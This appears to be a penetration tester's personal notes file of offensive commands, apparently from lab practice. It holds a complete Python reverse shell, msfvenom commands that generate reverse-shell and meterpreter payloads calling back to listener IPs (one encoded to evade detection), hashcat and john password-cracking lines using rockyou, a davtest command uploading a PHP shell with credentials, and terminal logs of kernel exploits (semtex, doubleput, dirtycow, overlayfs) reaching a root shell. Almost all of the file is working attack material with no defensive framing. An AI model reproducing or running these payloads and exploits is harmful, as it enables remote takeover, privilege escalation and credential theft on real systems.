# notes

## python reverse shell
(redirect stdin, stdout, stderr to open socket)  
import socket,subprocess,os,sys  
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
s.connect((sys.argv[1],int(sys.argv[2])))  
os.dup2(s.fileno(),0)  
os.dup2(s.fileno(),1)  
os.dup2(s.fileno(),2)  
p=subprocess.call(["/bin/sh","-i"])  

## msfvenom payloads I've used
msfvenom -p cmd/unix/reverse_bash lhost=172.16.3.1 lport=4123 R > shell.sh  
msfvenom -p php/meterpreter_reverse_tcp LHOST=172.16.3.1 LPORT=4123 -f raw > shell.php  
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.16.3.3 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x26' -f python --smallest  

## hashcat
store cracks in a different potfile:  
hashcat --potfile-path hashcat.pot -m 1000 -a 0 hashes.txt ~/wordlists/rockyou.txt  

## old centos
bash-4.1$ /usr/bin/gcc -O2 semtex.c -o semtex  
/usr/bin/gcc -O2 semtex.c -o semtex  
bash-4.1$ chmod +x semtex  
chmod +x semtex  
bash-4.1$ ./semtex  
./semtex  
2.6.37-3.x x86_64  
sd@fucksheep.org 2010  
-sh-4.1#  

## Linux kernel 4.4 < 4.5.5 w/CONFIG_BPF_SYSCALL
www-data@dolphin:/tmp$ ./doubleput  
./doubleput  
starting writev  
woohoo, got pointer reuse  
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.  
suid file detected, launching rootshell...  
we have root privs now...  
root@dolphin:/tmp#  

## dirtycow
bash-4.2$ ./cowroot  
./cowroot  
id  
uid=0(root) gid=48(apache) groups=0(root),48(apache)  

## overlayfs
$ gcc overlayfail.c -o overlayfail  
$ ./overlayfail  
root@vps1723:/tmp#  

## awk
awk '{print "admin:XAMPP with WebDAV:" $0}' /usr/share/wordlists/rockyou.txt | john hashes.txt --format=raw-md5 --pipe  

## john
awk '{print "admin:XAMPP with WebDAV:" $0}' /usr/share/wordlists/rockyou.txt | john hashes.txt --format=raw-md5 --pipe  

## webdav
davtest -url http://10.13.1.146/webdav -auth admin:s3cr3t -uploadfile shell.php -uploadloc shell.php  
